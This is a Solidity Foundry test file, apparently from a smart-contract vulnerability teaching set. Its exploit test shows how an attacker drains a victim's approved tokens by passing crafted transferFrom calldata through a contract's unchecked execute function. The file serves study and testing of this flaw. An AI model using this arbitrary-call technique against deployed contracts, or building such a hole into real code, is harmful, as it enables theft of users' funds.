// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/A16/CustomCallAbuse.sol";
import "../src/A16/CustomCallAbuseFixed.sol";

// A minimal ERC20-like token for the test scenario.
contract DummyToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }
    function approve(address spender, uint256 amount) public {
        allowance[msg.sender][spender] = amount;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        require(balanceOf[from] >= amount, "insufficient balance");
        require(
            allowance[from][msg.sender] >= amount,
            "insufficient allowance"
        );
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}

contract CustomCallAbuseTest is Test {
    CustomCallAbuse internal vulnerableContract;
    DummyToken internal stablecoin;

    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vulnerableContract = new CustomCallAbuse();
        stablecoin = new DummyToken();
        stablecoin.mint(victim, 1000 ether);
    }

    // --- VULNERABILITY TEST ---

    function test_Exploit_StealApprovedTokens() public {
        // --- Arrange ---
        // 1. Victim approves the vulnerable contract to spend 500 of their stablecoins.
        uint256 approvalAmount = 500 ether;
        vm.prank(victim);
        stablecoin.approve(address(vulnerableContract), approvalAmount);
        assertEq(
            stablecoin.allowance(victim, address(vulnerableContract)),
            approvalAmount
        );

        // 2. Attacker crafts the malicious calldata to call `transferFrom`.
        uint256 amountToSteal = 500 ether;
        bytes memory calldataForSteal = abi.encodeWithSelector(
            DummyToken.transferFrom.selector,
            victim,
            attacker,
            amountToSteal
        );

        // --- Act ---
        // 3. Attacker calls `execute` on the vulnerable contract.
        vm.prank(attacker);
        vulnerableContract.execute(address(stablecoin), calldataForSteal);

        // --- Assert ---
        // 4. Check if the funds were stolen from the victim and sent to the attacker.
        assertEq(
            stablecoin.balanceOf(attacker),
            amountToSteal,
            "Attacker should have stolen the funds"
        );
        assertEq(
            stablecoin.balanceOf(victim),
            1000 ether - amountToSteal,
            "Victim's balance should have decreased"
        );
        assertEq(
            stablecoin.allowance(victim, address(vulnerableContract)),
            0,
            "Allowance should be used"
        );
    }
}
